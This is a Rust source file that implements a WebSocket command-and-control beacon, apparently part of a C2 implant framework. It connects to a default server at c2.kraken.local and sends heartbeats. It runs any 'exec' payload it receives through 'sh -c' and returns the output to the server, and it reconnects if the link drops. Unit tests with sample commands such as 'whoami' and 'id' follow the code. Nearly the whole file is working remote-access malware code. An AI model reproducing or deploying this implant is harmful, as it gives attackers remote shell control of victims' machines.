use std::time::Duration;
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct WsBeaconConfig {
    pub server_url: String,
    pub reconnect_delay_secs: u64,
    pub heartbeat_interval_secs: u64,
    pub use_tls: bool,
}

impl Default for WsBeaconConfig {
    fn default() -> Self {
        WsBeaconConfig {
            server_url: "ws://c2.kraken.local:8080/ws".to_string(),
            reconnect_delay_secs: 10,
            heartbeat_interval_secs: 30,
            use_tls: false,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct WsMessage {
    pub msg_type: String,
    pub agent_id: String,
    pub payload: String,
}

pub struct WsBeacon {
    config: WsBeaconConfig,
    agent_id: String,
}

impl WsBeacon {
    pub fn new(config: WsBeaconConfig) -> Self {
        WsBeacon {
            agent_id: uuid::Uuid::new_v4().to_string(),
            config,
        }
    }

    pub fn with_agent_id(mut self, agent_id: &str) -> Self {
        self.agent_id = agent_id.to_string();
        self
    }

    pub async fn run(&self, mut cancel: tokio::sync::watch::Receiver<bool>) {
        loop {
            let url = if self.config.use_tls {
                self.config.server_url.replace("ws://", "wss://")
            } else {
                self.config.server_url.clone()
            };

            match connect_async(&url).await {
                Ok((ws_stream, _)) => {
                    log::info!("WS C2 connected to {}", url);
                    let (mut write, mut read) = ws_stream.split();

                    let hb_msg = WsMessage {
                        msg_type: "heartbeat".to_string(),
                        agent_id: self.agent_id.clone(),
                        payload: "alive".to_string(),
                    };
                    if let Ok(json) = serde_json::to_string(&hb_msg) {
                        let _ = write.send(Message::Text(json)).await;
                    }

                    let mut hb_interval = tokio::time::interval(
                        Duration::from_secs(self.config.heartbeat_interval_secs)
                    );

                    loop {
                        tokio::select! {
                            msg = read.next() => {
                                match msg {
                                    Some(Ok(Message::Text(text))) => {
                                        log::info!("WS C2 msg: {}", text);
                                        if let Ok(cmd) = serde_json::from_str::<WsMessage>(&text) {
                                            if cmd.msg_type == "exec" {
                                                let result = std::process::Command::new("sh")
                                                    .args(["-c", &cmd.payload])
                                                    .output();
                                                if let Ok(output) = result {
                                                    let response = WsMessage {
                                                        msg_type: "result".to_string(),
                                                        agent_id: self.agent_id.clone(),
                                                        payload: String::from_utf8_lossy(&output.stdout).to_string(),
                                                    };
                                                    if let Ok(json) = serde_json::to_string(&response) {
                                                        let _ = write.send(Message::Text(json)).await;
                                                    }
                                                }
                                            } else if cmd.msg_type == "kill" {
                                                log::info!("WS C2 kill received");
                                                return;
                                            }
                                        }
                                    }
                                    Some(Ok(Message::Close(_))) | None => {
                                        log::warn!("WS C2 disconnected");
                                        break;
                                    }
                                    _ => {}
                                }
                            }
                            _ = hb_interval.tick() => {
                                let hb = WsMessage {
                                    msg_type: "heartbeat".to_string(),
                                    agent_id: self.agent_id.clone(),
                                    payload: "alive".to_string(),
                                };
                                if let Ok(json) = serde_json::to_string(&hb) {
                                    let _ = write.send(Message::Text(json)).await;
                                }
                            }
                            _ = cancel.changed() => {
                                if *cancel.borrow() { return; }
                            }
                        }
                    }
                }
                Err(e) => {
                    log::warn!("WS C2 connection failed: {}. retrying...", e);
                    tokio::time::sleep(Duration::from_secs(self.config.reconnect_delay_secs)).await;
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ws_config_default() {
        let config = WsBeaconConfig::default();
        assert!(config.server_url.contains("c2.kraken.local"));
        assert_eq!(config.reconnect_delay_secs, 10);
    }

    #[test]
    fn test_ws_message_serialization() {
        let msg = WsMessage {
            msg_type: "exec".to_string(),
            agent_id: "agent-001".to_string(),
            payload: "whoami".to_string(),
        };
        let json = serde_json::to_string_pretty(&msg).unwrap();
        assert!(json.contains("exec"));
        assert!(json.contains("agent-001"));
    }

    #[test]
    fn test_ws_message_heartbeat() {
        let msg = WsMessage {
            msg_type: "heartbeat".to_string(),
            agent_id: "test".to_string(),
            payload: "alive".to_string(),
        };
        assert_eq!(msg.msg_type, "heartbeat");
    }

    #[test]
    fn test_ws_config_tls() {
        let mut config = WsBeaconConfig::default();
        config.use_tls = true;
        assert!(config.use_tls);
    }

    #[test]
    fn test_ws_beacon_agent_id() {
        let config = WsBeaconConfig::default();
        let beacon = WsBeacon::new(config).with_agent_id("ws-agent");
        assert_eq!(beacon.agent_id, "ws-agent");
    }

    #[test]
    fn test_ws_message_deserialization() {
        let json = r#"{"msg_type":"exec","agent_id":"agent-1","payload":"id"}"#;
        let msg: WsMessage = serde_json::from_str(json).unwrap();
        assert_eq!(msg.msg_type, "exec");
        assert_eq!(msg.payload, "id");
    }
}
